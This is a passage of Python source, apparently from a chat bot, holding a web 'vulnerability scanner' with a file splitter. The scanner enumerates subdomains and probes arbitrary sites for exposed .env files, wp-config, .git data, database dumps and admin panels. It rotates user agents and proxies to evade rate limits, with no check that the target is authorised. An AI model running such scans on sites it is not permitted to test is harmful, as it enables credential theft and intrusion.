        h = a['href']
        if h.startswith(('#','mailto:','tel:','javascript:')): continue
        full = urljoin(base_url, h)
        p    = urlparse(full)
        if p.netloc == netloc:
            links.add(p._replace(fragment='').geturl())
    return links



# ══════════════════════════════════════════════════
# ✂️  FILE SPLITTER
# ══════════════════════════════════════════════════

def split_zip(zip_path: str, part_mb: float = SPLIT_MB) -> list:
    part_size = int(part_mb * 1024 * 1024)
    base  = zip_path.replace('.zip','')
    parts = []
    num   = 1
    with open(zip_path,'rb') as f:
        while True:
            chunk = f.read(part_size)
            if not chunk: break
            p = f"{base}.part{num:02d}.zip"
            with open(p,'wb') as pf: pf.write(chunk)
            parts.append(p)
            num += 1
    return parts

def needs_split(path: str) -> bool:
    return os.path.getsize(path) > SPLIT_MB * 1024 * 1024


# ══════════════════════════════════════════════════
# 🛡️  VULNERABILITY SCANNER  v4
#     - Cloudflare catch-all detection
#     - Baseline fingerprint comparison
#     - Adaptive delay (anti-rate-limit)
#     - Real subdomain verification
# ══════════════════════════════════════════════════

_COMMON_SUBDOMAINS = [
    "api", "admin", "dev", "staging", "test",
    "beta", "app", "portal", "dashboard", "panel",
    "manage", "backend", "internal", "static",
    "mail", "backup", "vpn", "git", "gitlab",
    "jenkins", "ci", "build", "docs", "help",
    "shop", "store", "blog", "status", "monitor",
    "db", "database", "phpmyadmin", "cdn", "media",
    "assets", "files", "upload", "img", "images",
    "auth", "login", "sso", "oauth", "api2",
]

_VULN_PATHS = [
    # CRITICAL — Credentials
    ("/.env",                     "🔑 .env file",               "CRITICAL"),
    ("/.env.local",               "🔑 .env.local",              "CRITICAL"),
    ("/.env.backup",              "🔑 .env.backup",             "CRITICAL"),
    ("/.env.production",          "🔑 .env.production",         "CRITICAL"),
    ("/wp-config.php",            "🔑 wp-config.php",           "CRITICAL"),
    ("/wp-config.php.bak",        "🔑 wp-config.php.bak",       "CRITICAL"),
    ("/config.php",               "🔑 config.php",              "HIGH"),
    ("/config.yml",               "🔑 config.yml",              "HIGH"),
    ("/config.json",              "🔑 config.json",             "HIGH"),
    ("/database.yml",             "🔑 database.yml",            "HIGH"),
    ("/settings.py",              "🔑 settings.py",             "HIGH"),
    # CRITICAL — VCS
    ("/.git/config",              "📁 .git/config",             "CRITICAL"),
    ("/.git/HEAD",                "📁 .git/HEAD",               "CRITICAL"),
    ("/.svn/entries",             "📁 .svn entries",            "HIGH"),
    # CRITICAL — Backups
    ("/backup.zip",               "🗜️ backup.zip",              "CRITICAL"),
    ("/backup.sql",               "🗜️ backup.sql",              "CRITICAL"),
    ("/dump.sql",                 "🗜️ dump.sql",                "CRITICAL"),
    ("/db.sql",                   "🗜️ db.sql",                  "CRITICAL"),
    ("/backup.tar.gz",            "🗜️ backup.tar.gz",           "CRITICAL"),
    ("/site.zip",                 "🗜️ site.zip",                "HIGH"),
    # HIGH — Admin panels
    ("/phpmyadmin/",              "🔐 phpMyAdmin",              "HIGH"),
    ("/pma/",                     "🔐 phpMyAdmin /pma/",        "HIGH"),
    ("/adminer.php",              "🔐 Adminer DB UI",           "HIGH"),
    ("/admin",                    "🔐 Admin Panel",             "MEDIUM"),
    ("/admin/",                   "🔐 Admin Panel",             "MEDIUM"),
    ("/admin/login",              "🔐 Admin Login",             "MEDIUM"),
    ("/wp-admin/",                "🔐 WordPress Admin",         "MEDIUM"),
    ("/administrator/",           "🔐 Joomla Admin",            "MEDIUM"),
    ("/dashboard",                "🔐 Dashboard",               "MEDIUM"),
    ("/login",                    "🔐 Login Page",              "LOW"),
    # HIGH — Logs
    ("/error.log",                "📋 error.log",               "HIGH"),
    ("/access.log",               "📋 access.log",              "HIGH"),
    ("/debug.log",                "📋 debug.log",               "HIGH"),
    ("/storage/logs/laravel.log", "📋 Laravel log",             "HIGH"),
    # MEDIUM — Server info
    ("/server-status",            "⚙️ Apache server-status",   "MEDIUM"),
    ("/web.config",               "⚙️ web.config",             "HIGH"),
    ("/.htaccess",                "⚙️ .htaccess",              "MEDIUM"),
    ("/xmlrpc.php",               "⚠️ xmlrpc.php",             "MEDIUM"),
    # LOW
    ("/composer.json",            "📦 composer.json",           "LOW"),
    ("/package.json",             "📦 package.json",            "LOW"),
    ("/requirements.txt",         "📦 requirements.txt",        "LOW"),
    # INFO
    ("/robots.txt",               "🤖 robots.txt",              "INFO"),
    ("/sitemap.xml",              "🗺️ sitemap.xml",             "INFO"),
]

_SEV_EMOJI = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🔵","INFO":"⚪"}
_SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
_SEC_HEADERS = {
    "Strict-Transport-Security": ("HSTS",           "HIGH"),
    "Content-Security-Policy":   ("CSP",            "MEDIUM"),
    "X-Frame-Options":           ("X-Frame-Options","MEDIUM"),
    "X-Content-Type-Options":    ("X-Content-Type", "LOW"),
    "Referrer-Policy":           ("Referrer-Policy","LOW"),
    "Permissions-Policy":        ("Permissions-Policy","LOW"),
}
_FAKE_SIGS = [
    b"404", b"not found", b"page not found",
    b"does not exist", b"no such file",
]

# User-Agents rotation (avoid rate limiting) — 60+ UAs for better evasion (updated 2025/2026)
_UA_LIST = [
    # ── Chrome — Windows (latest) ────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    # ── Chrome — Windows (slightly older, still common) ──────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.185 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36',
    # ── Chrome — macOS ───────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    # ── Chrome — Linux ───────────────────────────────────────────────
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    # ── Firefox — Windows ────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    # ── Firefox — macOS ──────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:128.0) Gecko/20100101 Firefox/128.0',
    # ── Firefox — Linux ──────────────────────────────────────────────
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
    # ── Safari — macOS ───────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    # ── Edge — Windows ───────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    # ── Mobile — Android Chrome ──────────────────────────────────────
    'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.137 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.79 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; RMX3890) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36',
    # ── Mobile — iOS Safari ──────────────────────────────────────────
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    # ── iPad ─────────────────────────────────────────────────────────
    'Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    # ── Opera ─────────────────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
    # ── Brave (Chrome-based) ──────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    # ── Mobile Firefox ───────────────────────────────────────────────
    'Mozilla/5.0 (Android 15; Mobile; rv:138.0) Gecko/138.0 Firefox/138.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0',
    # ── Samsung Internet ─────────────────────────────────────────────
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36',
]


def _get_headers() -> dict:
    """Rotate User-Agent each call with realistic browser headers."""
    ua = random.choice(_UA_LIST)
    is_mobile = 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua or 'iPad' in ua
    return {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice([
            'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.5',
            'en-US,en;q=0.9,fr;q=0.8', 'en-US,en;q=0.9,de;q=0.8',
        ]),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        **({"Sec-CH-UA-Mobile": "?1"} if is_mobile else {"Sec-CH-UA-Mobile": "?0"}),
    }


def _get_page_fingerprint(url: str, timeout: int = 6) -> tuple:
    """
    Get (status_code, body_hash, content_length) for baseline comparison.
    Used to detect catch-all pages.
    """
    try:
        resp = requests.get(url, headers=_get_headers(), timeout=timeout,
                            stream=True, allow_redirects=True, verify=False,
                            proxies=proxy_manager.get_proxy())
        status = resp.status_code
        chunk  = b''
        for part in resp.iter_content(1024):
            chunk += part
            if len(chunk) >= 1024: break
        resp.close()
        body_hash = hashlib.md5(chunk[:512]).hexdigest()
        ct_length = int(resp.headers.get('Content-Length', len(chunk)))
        return status, body_hash, ct_length, resp.headers.get('Content-Type','')
    except Exception:
        return 0, '', 0, ''


def _detect_catchall(base_url: str) -> tuple:
    """
    Request a random non-existent path — if it returns 200,
    the server has a catch-all (Cloudflare, custom 404 as 200).
    Returns (is_catchall: bool, baseline_hash: str, baseline_len: int)
    """
    rand_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=16)) + '.html'
    status, body_hash, ct_len, ct = _get_page_fingerprint(base_url.rstrip('/') + rand_path)
    if status == 200:
        return True, body_hash, ct_len   # catch-all confirmed
    return False, '', 0


def _is_fake_200_content(body: bytes, ct: str) -> bool:
    if 'html' not in ct.lower():
        return False
    snippet = body[:800].lower()
    return any(s in snippet for s in _FAKE_SIGS)


def _probe_one(
    base_url: str, path: str, label: str, severity: str,
    catchall: bool, baseline_hash: str, baseline_len: int,
    delay: float = 0.0
) -> dict | None:
    """
    Probe one path — GET + stream.
    Compares against baseline to filter catch-all false positives.
    """
    if delay > 0:
        time.sleep(delay)

    full_url = base_url.rstrip('/') + path
    try:
        resp = requests.get(
            full_url, headers=_get_headers(),
            timeout=8, stream=True,
            allow_redirects=True, verify=False,
            proxies=proxy_manager.get_proxy(),
        )
        status = resp.status_code
        ct     = resp.headers.get('Content-Type', '')

        if status == 200:
            chunk = b''
            for part in resp.iter_content(1024):
                chunk += part
                if len(chunk) >= 1024: break
            resp.close()

            # ── Catch-all filter ──────────────────
            if catchall:
                page_hash = hashlib.md5(chunk[:512]).hexdigest()
                page_len  = int(resp.headers.get('Content-Length', len(chunk)))
                # Same hash or very similar length = catch-all page
                if page_hash == baseline_hash:
                    return None
                if baseline_len > 0 and abs(page_len - baseline_len) < 50:
                    return None

            # ── Fake 200 (custom 404 HTML) ────────
            if _is_fake_200_content(chunk, ct):
                return None

            size = int(resp.headers.get('Content-Length', len(chunk)))
            return {
                "path": path, "full_url": full_url,
                "label": label, "severity": severity,
                "status": 200, "protected": False, "size": size,
            }

        elif status == 403 and severity in ("CRITICAL","HIGH"):
            resp.close()
            # Cloudflare 403 = file might exist but CF blocks it
            cf = 'cloudflare' in resp.headers.get('Server','').lower() or \
                 'cf-ray' in resp.headers
            note = " (CF-blocked)" if cf else ""
            return {
                "path": path, "full_url": full_url,
                "label": label + note, "severity": "MEDIUM",
                "status": 403, "protected": True, "size": 0,
            }

        elif status in (301,302,307,308):
            loc = resp.headers.get('Location','')
            resp.close()
            if severity in ("HIGH","MEDIUM","LOW") and any(
                k in loc for k in ('login','auth','signin','session')
            ):
                return {
                    "path": path, "full_url": full_url,
                    "label": label + " (→ login)",
                    "severity": severity, "status": status,
                    "protected": True, "size": 0,
                }

        else:
            try: resp.close()
            except: pass

    except requests.exceptions.Timeout:
        pass
    except Exception:
        pass
    return None


def _verify_subdomain_real(sub_url: str) -> bool:
    """
    A subdomain is 'real' only if:
    1. DNS resolves OK
    2. HTTP responds (any code)
    3. It has DIFFERENT content than a random path on SAME subdomain
       (i.e. not a Cloudflare/nginx catch-all that mirrors base domain)
    """
    try:
        hostname = urlparse(sub_url).hostname
        socket.gethostbyname(hostname)   # DNS must resolve
    except socket.gaierror:
        return False  # NXDOMAIN = not real

    # Check if it returns anything
    try:
        r = requests.get(sub_url, headers=_get_headers(), timeout=5,
                         proxies=proxy_manager.get_proxy(), allow_redirects=True, verify=False, stream=True)
        r.close()
        code = r.status_code
        if code >= 500:
            return False
    except Exception:
        return False

    # Verify it's NOT a catch-all mirror of the base domain
    is_catchall, _, _ = _detect_catchall(sub_url)
    # Even catch-all subdomains can be real services — just note it
    # We still include them but mark behavior
    return True


def _scan_target_sync(
    target_url: str, delay_per_req: float = 0.3
) -> tuple:
    """Scan one URL with catch-all detection and delays."""
    exposed   = []
    protected = []

    # Detect catch-all first
    catchall, baseline_hash, baseline_len = _detect_catchall(target_url)

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        fmap = {
            ex.submit(
                _probe_one, target_url, path, label, sev,
                catchall, baseline_hash, baseline_len,
                delay_per_req * (i % 5)   # stagger delays 0/0.3/0.6/0.9/1.2s
            ): (path, label, sev)
            for i, (path, label, sev) in enumerate(_VULN_PATHS)
        }
        for fut in concurrent.futures.as_completed(fmap, timeout=120):
            try:
                f = fut.result(timeout=15)
                if f:
                    (protected if f["protected"] else exposed).append(f)
            except Exception:
                pass

    exposed.sort(key=lambda x: _SEV_ORDER.get(x["severity"],9))
    protected.sort(key=lambda x: _SEV_ORDER.get(x["severity"],9))
    return exposed, protected, catchall


def _discover_subdomains_sync(base_url: str, progress_q: list) -> list:
    """
    Discover live subdomains — with real verification (not catch-all mirrors).
    """
    parsed = urlparse(base_url)
    scheme = parsed.scheme
    parts  = parsed.hostname.split('.')
    root   = '.'.join(parts[-2:]) if len(parts) > 2 else parsed.hostname

    progress_q.append(
        f"📡 Subdomain discovery...\n"
        f"Testing `{len(_COMMON_SUBDOMAINS)}` common names on `{root}`"
    )

    live = []

    def check_sub(sub):
        url = f"{scheme}://{sub}.{root}"
        if _verify_subdomain_real(url):
            return url
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(check_sub, sub): sub for sub in _COMMON_SUBDOMAINS}
        for fut in concurrent.futures.as_completed(futures, timeout=40):
            try:
                result = fut.result(timeout=8)
                if result:
                    live.append(result)
            except Exception:
                pass

    return live


def _vuln_scan_sync(url: str, progress_q: list) -> dict:
    """Main orchestrator."""
    # Detect Cloudflare → increase delays
    is_cloudflare = False
    results = {
        "url": url, "findings": [],
        "missing_headers": [], "clickjacking": False,
        "https": url.startswith("https://"),
        "server": "Unknown", "subdomains_found": [],
        "total_scanned": 0, "errors": 0,
        "cloudflare": False,
    }

    # ── Baseline headers ──────────────────────────
    progress_q.append("🔍 Checking security headers...")
    try:
        r0   = requests.get(url, timeout=10, headers=_get_headers(),
                            proxies=proxy_manager.get_proxy(), allow_redirects=True, verify=False)
        hdrs = dict(r0.headers)
        srv  = hdrs.get('Server','Unknown')
        results["server"] = srv[:60]
        is_cloudflare = 'cloudflare' in srv.lower() or 'cf-ray' in hdrs
        results["cloudflare"] = is_cloudflare

        for hdr,(name,sev) in _SEC_HEADERS.items():
            if hdr not in hdrs:
                results["missing_headers"].append((name,hdr,sev))
        if srv and any(c.isdigit() for c in srv):
            results["missing_headers"].append(
                ("Server version leak", f"Server: {srv[:50]}", "LOW"))
        xpb = hdrs.get('X-Powered-By','')
        if xpb:
            results["missing_headers"].append(
                ("Tech disclosure", f"X-Powered-By: {xpb[:40]}", "LOW"))
        has_xfo = 'X-Frame-Options' in hdrs
        has_fa  = 'frame-ancestors' in hdrs.get('Content-Security-Policy','')
        results["clickjacking"] = not has_xfo and not has_fa
    except Exception:
        results["errors"] += 1

    # Cloudflare = slower scan to avoid rate limiting
    req_delay = 0.8 if is_cloudflare else 0.2
    sub_workers = 5 if is_cloudflare else 10

    if is_cloudflare:
        progress_q.append(
            "☁️ *Cloudflare detected*\n"
            "Slower scan mode to avoid rate limiting..."
        )

    # ── Subdomain discovery ───────────────────────
    live_subs = _discover_subdomains_sync(url, progress_q)
    results["subdomains_found"] = live_subs

    if live_subs:
        progress_q.append(
            f"✅ *{len(live_subs)} real subdomains found:*\n"
            + "\n".join(f"  • `{urlparse(s).netloc}`" for s in live_subs[:8])
        )
    else:
        progress_q.append("📭 No live subdomains found")

    # ── Scan each target ──────────────────────────
    all_targets = [url] + live_subs
    for i, target in enumerate(all_targets):
        netloc = urlparse(target).netloc
        progress_q.append(
            f"🔍 Scanning `{netloc}`...\n"
            f"Target `{i+1}/{len(all_targets)}`"
            + (" ☁️ slow mode" if is_cloudflare else "")
        )
        exposed, protected, catchall = _scan_target_sync(target, req_delay)
        results["total_scanned"] += len(_VULN_PATHS)
        if exposed or protected:
            results["findings"].append({
                "target":    target,
                "netloc":    netloc,
                "exposed":   exposed,
                "protected": protected,
                "catchall":  catchall,
            })

    return results


def _format_vuln_report(r: dict) -> str:
    domain = urlparse(r["url"]).netloc
    lines  = []

    total_exp = sum(len(f["exposed"]) for f in r["findings"])
    all_sevs  = [fi["severity"] for f in r["findings"] for fi in f["exposed"]]

    if   "CRITICAL" in all_sevs:                       overall = "🔴 CRITICAL RISK"
    elif "HIGH"     in all_sevs:                       overall = "🟠 HIGH RISK"
    elif "MEDIUM"   in all_sevs or r["clickjacking"]:  overall = "🟡 MEDIUM RISK"
    elif r["missing_headers"]:                         overall = "🔵 LOW RISK"
    else:                                              overall = "✅ CLEAN"

    cf_badge = " ☁️ Cloudflare" if r.get("cloudflare") else ""
    lines += [
        "🛡️ *Vulnerability Scan Report*",
        f"🌐 `{domain}`{cf_badge}",
        f"📊 Risk: *{overall}*",
        f"🔍 Paths: `{r['total_scanned']}` | Issues: `{total_exp}`",
        f"📡 Subdomains: `{len(r['subdomains_found'])}`",
        f"🖥️ Server: `{r['server']}`",
        "",
    ]

    # Subdomains
    if r["subdomains_found"]:
        lines.append("*📡 Live Subdomains:*")
        for s in r["subdomains_found"]:
            lines.append(f"  • {s}")
        lines.append("")

    # HTTPS
    lines.append("*🔐 HTTPS:*")
    lines.append("  ✅ HTTPS enabled" if r["https"] else "  🔴 HTTP only — no encryption!")
    lines.append("")

    # Findings per target
    if r["findings"]:
        for f in r["findings"]:
            if f["exposed"]:
                lines.append(f"*🚨 Exposed — `{f['netloc']}`:*")
                for fi in f["exposed"]:
                    em   = _SEV_EMOJI.get(fi["severity"],"⚪")
                    note = f" `[{fi['status']}]`"
                    lines.append(f"  {em} `{fi['severity']}` — {fi['label']}{note}")
                    lines.append(f"  🔗 {fi['full_url']}")
                lines.append("")
            if f["protected"]:
                lines.append(f"*⚠️ Blocked (403) — `{f['netloc']}`:*")
                for fi in f["protected"][:5]:
                    em = _SEV_EMOJI.get(fi["severity"],"⚪")
                    lines.append(f"  {em} {fi['label']}")
                    lines.append(f"  🔗 {fi['full_url']}")
                lines.append("")
    else:
        lines += ["*✅ No exposed files found*", ""]

    # Clickjacking
    lines.append("*🖼️ Clickjacking:*")
    if r["clickjacking"]:
        lines.append("  🟠 Vulnerable — no X-Frame-Options / frame-ancestors")
    else:
        lines.append("  ✅ Protected")
    lines.append("")

    # Security headers
